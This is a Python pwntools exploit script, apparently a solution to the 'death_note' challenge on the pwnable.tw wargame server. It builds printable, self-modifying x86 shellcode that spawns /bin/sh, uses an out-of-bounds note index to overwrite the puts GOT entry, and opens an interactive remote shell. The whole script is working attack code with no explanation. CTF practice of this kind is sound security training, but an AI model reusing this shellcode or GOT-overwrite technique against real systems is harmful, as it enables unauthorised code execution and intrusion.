#!/usr/bin/env python3
from pwn import *

elf = ELF("./death_note")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
# gdb.attach(
#     p,
#     """
# 	b *main+96
# 	b *main+103
# 	b *main+110
# """,
# )
p = remote("chall.pwnable.tw", "10201")


def is_printable(data):
    shellcode = data.decode()
    for i in range(len(shellcode)):
        if ord(shellcode[i]) <= 0x1F or ord(shellcode[i]) == 0x7F:
            return False
    return True


def add_note(idx, data):
    p.sendlineafter(b"choice :", str(1).encode())
    p.sendlineafter(b"Index :", str(idx).encode())
    p.sendlineafter(b"Name :", data)
    return


def show_note(idx):
    p.sendlineafter(b"choice :", str(2).encode())
    p.sendlineafter(b"Index :", str(idx).encode())
    p.recvuntil(b"Name : ")
    data = p.recvline()
    print(data)
    return


def del_note(idx):
    p.sendlineafter(b"choice :", str(3).encode())
    p.sendlineafter(b"Index :", str(idx).encode())
    return


shellcode = (
    asm(
        """
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x53
    pop edx
    sub byte ptr [eax+39],dl
    sub byte ptr [eax+40],dl
    push 0x70
    pop edx
    xor byte ptr [eax+40],dl
  
    push ecx
    pop eax
    push ecx
    pop edx
    xor al,43
    xor al,32
    """
    )
    + b"\x20\x43"
)
note_address = 0x804A060
assert is_printable(shellcode)
offset = (elf.got["puts"] - note_address) // 4
log.info("offset is: " + str(offset))
payload = b""
payload += shellcode
add_note(offset, payload)


p.interactive()
